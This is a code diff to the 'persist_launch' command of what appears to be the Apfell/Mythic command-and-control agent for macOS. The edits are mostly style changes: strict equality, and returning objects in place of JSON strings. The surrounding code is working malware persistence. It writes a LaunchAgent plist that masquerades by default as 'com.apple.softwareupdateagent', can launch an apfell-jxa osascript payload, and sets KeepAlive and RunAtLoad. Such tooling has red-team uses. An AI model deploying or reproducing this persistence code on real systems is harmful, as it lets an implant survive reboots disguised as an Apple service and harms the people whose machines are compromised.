@@ -7,11 +7,11 @@ exports.persist_launch = function(task, command, params){
                 "<dict>\n" +
                 "<key>Label</key>\n";
         let label = "com.apple.softwareupdateagent";
-        if(config.hasOwnProperty('label') && config['label'] != ""){label = config['label'];}
+        if(config.hasOwnProperty('label') && config['label'] !== ""){label = config['label'];}
         template += "<string>" + label + "</string>\n";
         template += "<key>ProgramArguments</key><array>\n";
         if(config.hasOwnProperty('args') && config['args'].length > 0){
-            if(config['args'][0] == "apfell-jxa"){
+            if(config['args'][0] === "apfell-jxa"){
                 // we'll add in an apfell-jxa one liner to run
                 template += "<string>/usr/bin/osascript</string>\n" +
                 "<string>-l</string>\n" +
@@ -27,15 +27,15 @@ exports.persist_launch = function(task, command, params){
             }
         }
         else{
-            return JSON.stringify({"user_output": "Program args needs values for \"apfell-jxa\"", "completed": true, "status": "error"});
+            return {"user_output": "Program args needs values for \"apfell-jxa\"", "completed": true, "status": "error"};
         }
         template += "</array>\n";
-        if(config.hasOwnProperty('KeepAlive') && config['KeepAlive'] == true){ template += "<key>KeepAlive</key>\n<true/>\n"; }
-        if(config.hasOwnProperty('RunAtLoad') && config['RunAtLoad'] == true){ template += "<key>RunAtLoad</key>\n<true/>\n"; }
+        if(config.hasOwnProperty('KeepAlive') && config['KeepAlive'] === true){ template += "<key>KeepAlive</key>\n<true/>\n"; }
+        if(config.hasOwnProperty('RunAtLoad') && config['RunAtLoad'] === true){ template += "<key>RunAtLoad</key>\n<true/>\n"; }
         template += "</dict>\n</plist>\n"
         // now we need to actually write out the plist to disk
         let response = "";
-        if(config.hasOwnProperty('LocalAgent') && config['LocalAgent'] == true){
+        if(config.hasOwnProperty('LocalAgent') && config['LocalAgent'] === true){
             let path = "~/Library/LaunchAgents/";
             path = $(path).stringByExpandingTildeInPath;
             var fileManager = $.NSFileManager.defaultManager;
@@ -45,12 +45,12 @@ exports.persist_launch = function(task, command, params){
             path = $(path.js + "/" + label + ".plist");
             response = write_data_to_file(template, path);
         }
-        else if(config.hasOwnProperty('LaunchPath') && config['LaunchPath'] != ""){
+        else if(config.hasOwnProperty('LaunchPath') && config['LaunchPath'] !== ""){
             response = write_data_to_file(template, $(config['LaunchPath']));
         }
-        return JSON.stringify({"user_output":response, "completed": true});
+        return {"user_output":response, "completed": true};
     }catch(error){
-        return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
+        return {"user_output":error.toString(), "completed": true, "status": "error"};
     }
 };
 COMMAND_ENDS_HERE
